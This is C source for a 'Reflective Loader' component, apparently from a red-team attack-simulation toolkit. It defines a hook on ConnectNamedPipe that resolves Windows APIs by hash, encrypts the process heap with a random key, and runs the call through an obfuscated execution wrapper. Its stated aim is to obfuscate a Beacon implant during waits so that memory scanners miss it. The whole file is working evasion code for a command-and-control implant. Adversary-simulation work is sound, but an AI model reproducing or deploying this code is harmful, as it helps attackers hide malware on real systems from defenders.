/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef struct
{
	D_API( RtlInitUnicodeString );
	D_API( ConnectNamedPipe );
	D_API( LdrUnloadDll );
	D_API( LdrLoadDll );
} API ;

/* API Hashes */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_CONNECTNAMEDPIPE		0x436e4c62 /* ConnectNamedPipe */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Obfuscates Beacon when it calls WaitForSingleObject
 *
!*/
D_SEC( D ) BOOLEAN WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _In_ LPOVERLAPPED lpOverlapped ) 
{
	API		Api;
	UNICODE_STRING	Uni;

	BYTE		Key[ 16 ];
	PVOID		K32 = NULL;
	BOOLEAN		Ret = FALSE;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );

	Api.RtlInitUnicodeString = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLINITUNICODESTRING );
	Api.LdrUnloadDll         = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRUNLOADDLL );
	Api.LdrLoadDll           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_LDRLOADDLL );

	RandomString( &Key, sizeof( Key ) );

	/* Encrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	Api.RtlInitUnicodeString( &Uni, C_PTR( G_SYM( L"kernel32.dll" ) ) );

	/* 'Load' kernel32.dll into memory */
	if ( NT_SUCCESS( Api.LdrLoadDll( NULL, 0, &Uni, &K32 ) ) ) {

		/* Reference the API and execute obfuscated */
		Api.ConnectNamedPipe = PeGetFuncEat( K32, H_API_CONNECTNAMEDPIPE );
		Ret = OBF_EXECUTE( Api.ConnectNamedPipe, hNamedPipe, lpOverlapped );

		/* Dererefere */
		Api.LdrUnloadDll( K32 );
	};

	/* Decrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
	RtlSecureZeroMemory( &Key, sizeof( Key ) );

	/* Return */
	return Ret;
};
